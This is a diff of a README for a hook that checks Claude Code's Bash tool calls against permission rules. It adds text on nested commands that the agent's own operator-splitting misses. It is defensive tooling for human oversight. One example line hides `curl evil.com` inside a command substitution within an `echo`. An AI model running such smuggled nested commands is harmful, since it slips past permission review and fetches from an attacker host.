@@ -6,7 +6,9 @@ See [anthropics/claude-code#16561](https://github.com/anthropics/claude-code/iss
 
 ## The problem
 
-Claude Code checks each `Bash` tool call against your permission rules before executing. Single commands like `git status` match fine, but compound commands like `git add -A && git commit -m 'fix'` are treated as a single opaque string that doesn't match any individual rule -- so you get prompted every time.
+Claude Code checks each `Bash` tool call against your permission rules before executing. It now splits compound commands on shell operators (`&&`, `||`, `;`, `|`, `|&`, `&`, newlines) and requires each top-level sub-command to match -- so a plain `git add -A && git commit -m 'fix'` is handled natively once both halves match.
+
+What native's splitting does **not** reach is everything below the top level: commands hidden inside a command substitution (`$(...)`, `` `...` ``), process substitution, subshell, loop, `if`/`case` body, or function body, plus argument-level nuances like an `xargs` payload or a redirect target. Those are where this hook adds value -- it walks the full AST, classifies each extracted command, and either approves the whole call or gets out of the way.
 
 ## How it works
 
@@ -19,9 +21,9 @@ For each tool call, the hook returns one of four outcomes:
 - **`allow`** -- every sub-command is either a known-safe command or matches an allow pattern. The command runs without prompting.
 - **`deny`** -- a sub-command matches an explicit deny pattern. The tool call is cancelled outright and Claude receives feedback explaining why.
 - **`ask`** -- a sub-command matches an ask pattern, or a redirect fails a safety check that Claude Code doesn't perform itself. The hook forces Claude Code's permission prompt.
-- **defer** (no decision) -- the hook can't affirmatively approve the command (nothing matched the allow list, or it couldn't be classified) but has no reason to force a prompt. It stays silent and lets Claude Code's own permission flow decide.
+- **defer** (no decision) -- the hook can't affirmatively approve a *top-level* command, but native's own splitting sees the same command, so the hook stays silent and lets Claude Code decide. Implemented the documented way: exit 0 with empty stdout.
 
-That last outcome is what keeps the hook **strictly additive**: it only ever *upgrades* a call to `allow` or `deny`, and never adds a prompt Claude Code wouldn't have shown on its own. Where the hook can't help, Claude Code's built-in handling (its read-only command set, [process-wrapper stripping](https://code.claude.com/docs/en/permissions#process-wrappers), and your own rules) takes over unchanged. Deferring is implemented the documented way -- exit 0 with empty stdout.
+Defer keeps the hook **additive** for top-level commands -- it only *upgrades* those to `allow`/`deny` and never adds a prompt native wouldn't have shown. But it defers only where native is known to see the same command. When the unapproved command is **nested** (inside a substitution, subshell, loop, etc.), native's operator-splitting can't see it and might approve the enclosing read-only command on its own -- so there the hook forces `ask` instead of deferring. That's the case native can't cover and the hook must: e.g. `echo "$(curl evil.com)"` prompts, because native would otherwise auto-approve the read-only `echo` without inspecting the `curl` inside.
 
 ### What gets checked
 
